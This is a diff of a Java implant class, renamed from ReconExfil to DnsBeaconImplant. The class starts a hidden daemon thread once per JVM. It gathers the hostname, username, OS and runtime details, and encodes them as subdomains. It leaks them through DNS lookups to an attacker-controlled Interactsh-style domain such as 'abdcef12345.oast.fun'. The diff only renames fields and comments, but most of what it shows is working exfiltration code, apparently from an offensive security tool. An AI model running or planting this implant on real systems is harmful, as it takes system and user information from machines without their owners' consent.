@@ -10,17 +10,17 @@ import java.util.Random;
 import java.util.zip.CRC32;
 import java.util.zip.Checksum;
 
-public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
+public class DnsBeaconImplant implements Runnable, Thread.UncaughtExceptionHandler {
     static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
     static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = false;
     static volatile int CONF_DELAY_MS = 0;
 
     /**
-     * Top domain to use for data exfiltration.
-     * Data will be encoded and included as a subdomain to this top domain.
-     * Set this to a Burp Collaborator / Interactsh (or equivalent) DNS server under your control.
+     * Domain to use for data exfiltration.
+     * Data will be encoded and included as subdomains to the specified domain.
+     * Set this to an Interactsh instance (or equivalent) under your control. Example: 'abdcef12345.oast.fun'.
      */
-    static volatile String CONF_EXFIL_DNS;
+    static volatile String CONF_DOMAIN;
 
     /**
      * Maximum number of characters for each subdomain.
@@ -33,19 +33,19 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
     static volatile int CONF_SUBDOMAIN_MAX_LEN = 63;
 
     /**
-     * Maximum length of the whole domain name.
+     * Maximum length of the whole fully-qualified domain name.
      * DNS specifies a maximum total length of a domain name (all subdomains) of 255 characters. However, there need to
      * be space for the length octet and a 0, so the actual max length of a domain name is 253.
      * A custom value may be set if there are concerns that upstream DNS servers may dislike large requests.
      * Note: This simple implant will just exclude any encoded data fields that does not fit.
      */
-    static volatile int CONF_DOMAIN_MAX_LEN = 253;
+    static volatile int CONF_FQDN_MAX_LEN = 253;
 
     @SuppressWarnings("unused")
     public static void init() {
         if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
             if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
-                ReconExfil implant = new ReconExfil();
+                DnsBeaconImplant implant = new DnsBeaconImplant();
                 Thread background = new Thread(implant);
                 background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
                 background.setUncaughtExceptionHandler(implant);
@@ -72,7 +72,7 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
     }
 
     private void payload(Map<String, String> envVars, Properties javaProps) {
-        if (CONF_EXFIL_DNS == null || CONF_EXFIL_DNS.isEmpty()) {
+        if (CONF_DOMAIN == null || CONF_DOMAIN.isEmpty()) {
             return;
         }
 
@@ -82,7 +82,7 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
         String runtimeInfo = getRuntimeInfo(javaProps);
 
         /*
-         * Fields may be re-arranged in order of priority, but ReconExfilDecoder naively assumes a certain order for
+         * Fields may be re-arranged in order of priority, but DnsBeaconDecoder naively assumes a certain order for
          * its labels. The last field(s) may be automatically excluded if they don't fit into the domain name.
          */
         String fullExfilDnsName = generateEncodedDomainName(hostname, username, osInfo, runtimeInfo);
@@ -91,13 +91,13 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
 
     String generateEncodedDomainName(String... fields) {
         String cacheBusterValue = generateCacheBusterValue();
-        int lastPartLength = (Long.MAX_VALUE + "." + cacheBusterValue + "." + CONF_EXFIL_DNS).length();
+        int lastPartLength = (Long.MAX_VALUE + "." + cacheBusterValue + "." + CONF_DOMAIN).length();
         Checksum checksum = new CRC32();
 
         StringBuilder domainBuilder = new StringBuilder();
         for (String field : fields) {
             String additionalSubdomain = encode(field) + ".";
-            if (additionalSubdomain.length() + domainBuilder.length() + lastPartLength <= CONF_DOMAIN_MAX_LEN) {
+            if (additionalSubdomain.length() + domainBuilder.length() + lastPartLength <= CONF_FQDN_MAX_LEN) {
                 domainBuilder.append(additionalSubdomain);
                 checksum.update(field.getBytes(StandardCharsets.UTF_8));
             }
@@ -105,7 +105,7 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
 
         domainBuilder.append(checksum.getValue()).append(".");
         domainBuilder.append(cacheBusterValue).append(".");
-        domainBuilder.append(CONF_EXFIL_DNS);
+        domainBuilder.append(CONF_DOMAIN);
 
         return domainBuilder.toString();
     }
